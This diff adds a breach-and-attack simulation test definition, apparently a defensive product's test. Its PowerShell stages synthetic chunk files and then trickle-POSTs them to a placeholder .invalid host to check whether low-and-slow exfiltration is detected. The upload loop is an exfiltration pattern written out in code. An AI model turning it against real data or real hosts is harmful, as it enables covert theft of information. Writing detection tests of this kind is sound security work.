@@ -1,0 +1,116 @@
+id: collection-low-and-slow-exfil
+product_line: dlp
+name: Low-and-Slow Scheduled Exfiltration Probe
+description: >
+  Telemetry-safe emulation of an adversary who stays under volume thresholds by
+  sending small pieces of data at a steady pace instead of one bulk transfer.
+  Eight small synthetic POSTs go to an RFC-6761 .invalid host with a short gap
+  between them. The run finishes in under a minute on purpose. A real low-and-slow
+  campaign runs for days, so this checks whether behavioural detection notices
+  the pattern early, not whether the full campaign succeeds.
+
+  KILL CHAIN STAGES:
+    1. Drip Staging        — prepare eight small synthetic chunks (T1074.001)
+    2. Scheduled Trickle   — POST each chunk to a .invalid host on a steady interval (T1029)
+
+  SAFETY: Every chunk is synthetic [BAS-SIM] text. Destinations are .invalid and
+  cannot resolve. The total run time is bounded to about 25 seconds. Files are
+  deleted in cleanup. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - exfiltration
+  - low-and-slow
+  - behavioral
+  - dlp
+  - t1029
+  - t1074
+  - mitre
+mitre_phases:
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Drip Staging (T1074.001)
+  # ---------------------------------------------------------------------------
+  - name: "Low-Slow Exfil 1 — Prepare Synthetic Drip Chunks (T1074.001)"
+    technique_id: T1074.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes eight small synthetic [BAS-SIM] chunk files under %TEMP%\\bas_drip_<runid>. Each is under 200 bytes."
+    telemetry:
+      - "Sysmon EID 11: eight small files created under %TEMP%\\bas_drip_<runid>"
+    detection:
+      - "EDR: a staging folder populated with many small files ahead of timed transfers"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_drip_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      1..8 | ForEach-Object { Set-Content -Path (Join-Path $work ("chunk_{0:d2}.txt" -f $_)) -Value "[BAS-SIM] drip chunk $_ run=$runId" -Encoding UTF8 }
+      $count = @(Get-ChildItem -Path $work -File).Count
+      Write-Output "EXEC T1074.001: prepared $count synthetic drip chunk(s) under $work. Drip Stage 1. [BAS-SIM-DRP-S1]"
+      Write-Output "FAIL: Small staged chunks were prepared for timed transfer with no alert. Chunking is a deliberate way to stay under bulk thresholds."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Scheduled Trickle (T1029)
+  # ---------------------------------------------------------------------------
+  - name: "Low-Slow Exfil 2 — Scheduled Trickle to .invalid (T1029)"
+    technique_id: T1029
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs each of the eight synthetic chunks to an RFC-6761 .invalid host, two seconds apart, for about 16 seconds in total. Nothing resolves, so no data leaves the host. Generates eight Sysmon EID 22 entries and eight EID 3 attempts."
+    telemetry:
+      - "Sysmon EID 22: repeated DNS queries for one .invalid host at a steady interval"
+      - "Proxy/egress log: eight small POSTs to one destination over a short window"
+    detection:
+      - "Behavioural egress: regular, small, same-destination uploads — scheduled-transfer pattern"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_drip_$runId"
+      $chunks = @(Get-ChildItem -Path $work -File -ErrorAction SilentlyContinue)
+      if ($chunks.Count -eq 0) {
+        Write-Output "SKIP: T1029: no drip chunks from Stage 1. [BAS-SIM-DRP-S2]"
+        exit 0
+      }
+      $target = "http://bas-sim-drip-$runId.invalid/upload"
+      $reachedCount = 0
+      foreach ($c in $chunks) {
+        try {
+          $r = Invoke-WebRequest -Uri $target -Method Post -InFile $c.FullName -ContentType 'text/plain' -TimeoutSec 5 -UseBasicParsing
+          if ($r.StatusCode) { $reachedCount++ }
+        } catch { }
+        Start-Sleep -Seconds 2
+      }
+      Write-Output "EXEC T1029: sent $($chunks.Count) synthetic chunk(s) to $target at a 2-second interval. reached=$reachedCount (expected: 0). Trickle Stage 2. [BAS-SIM-DRP-S2]"
+      if ($reachedCount -gt 0) {
+        Write-Output "FAIL: Scheduled small uploads to one unknown host succeeded. The egress path is not catching a low-and-slow pattern."
+      } else {
+        Write-Output "FAIL: The endpoint made a regular series of small uploads to one unknown host with no behavioural alert. Unreachable only because the domain is .invalid; the pattern is the signal to detect."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_drip_*') -Recurse -Force -ErrorAction SilentlyContinue
